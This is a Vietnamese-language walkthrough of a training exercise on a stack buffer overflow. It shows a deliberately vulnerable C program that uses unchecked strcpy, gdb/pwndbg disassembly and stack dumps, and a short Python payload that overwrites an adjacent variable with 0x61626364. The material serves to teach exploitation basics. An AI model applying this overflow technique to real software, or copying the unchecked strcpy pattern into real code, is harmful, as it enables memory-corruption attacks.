# Preview
Source code:
```shell
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) 
  {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) 
  {
    printf("you have correctly got the variable to the right value\n");
  } 
  else 
  {
    printf("Try again, you got 0x%08x\n", modified);
  }
}
```

# Exploit

Lỗ hổng nằm ở hàm strcpy(buffer, argv[1]); Hàm strcpy(D,S) copy mảng ký tự S sang D mà không kiểm tra kích thước của D và S từ đó dẫn tới tràn bộ nhớ.

**ASM**
```shell
└─$ gdb ./vuln
...<SNIP>...
pwndbg> disassem main
Dump of assembler code for function main:
.....
    0x080491a1 <+11>:    mov    ebp,esp
    0x080491a3 <+13>:    push   esi
    0x080491a4 <+14>:    push   ebx
    0x080491a5 <+15>:    push   ecx
    0x080491a6 <+16>:    sub    esp,0x5c        <--- Khởi tạo stack rộng 92 bytes
.....
    0x080491ee <+88>:    mov    eax,DWORD PTR [ebp-0x1c]    <--- Vị trí biến modified trong stack.
    0x080491f1 <+91>:    cmp    eax,0x61626364

```

Ta cần (0x5c - 0x1c) = 64 giá trị để ghi hết biến Buffer[] và 4 bytes để thay đổi giá trị biến **modified**.


**Stack**
```shell
pwndbg> stack 50
00:0000│ esp   0xffffce20 —▸ 0xf7ffdb9c —▸ 0xf7fc26f0 —▸ 0xf7ffda30 ◂— 0x0
01:0004│-064   0xffffce24 ◂— 0x1
02:0008│-060   0xffffce28 —▸ 0xf7fc2720 —▸ 0x80482da ◂— 'GLIBC_2.34'
03:000c│-05c   0xffffce2c ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaffff'
... ↓          15 skipped
13:004c│-01c   0xffffce6c ◂— 'ffff'
14:0050│-018   0xffffce70 —▸ 0xf7da8600 ◂— 0xbad06
15:0054│-014   0xffffce74 —▸ 0xf7fd9d41 (_dl_fixup+225) ◂— mov dword ptr [esp + 0x28], eax
16:0058│-010   0xffffce78 —▸ 0xf7da39a2 ◂— '_dl_audit_preinit'
17:005c│-00c   0xffffce7c —▸ 0xffffcea0 ◂— 0x2
18:0060│-008   0xffffce80 —▸ 0xf7fa4ff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c
19:0064│-004   0xffffce84 —▸ 0x804bf04 (__do_global_dtors_aux_fini_array_entry) —▸ 0x8049160 (__do_global_dtors_aux) ◂— 0xfb1e0ff3
1a:0068│ ebp   0xffffce88 ◂— 0x0
```
Biến **modifed** cần nhận giá trị 0x61626364 mà chương trình compile theo Litte endian => modified = "\x64\x63\x62\x61"

**Payload**
```shell
buffer = "a" * 64
modified = "\x64\x63\x62\x61"
payload = buffer + modified
print(payload)
```

**Attack**
```shell
pwndbg> run $(python2 payload.py)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
you have correctly got the variable to the right value          <--- [RIGHT]
[Inferior 1 (process 225) exited normally]
```
